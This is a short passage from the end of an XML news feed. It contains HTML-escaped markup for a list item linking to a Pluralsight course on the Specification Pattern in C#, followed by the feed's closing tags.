href=&#34;https://www.pluralsight.com/courses/csharp-specification-pattern&#34;&gt;Specification Pattern in C#&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>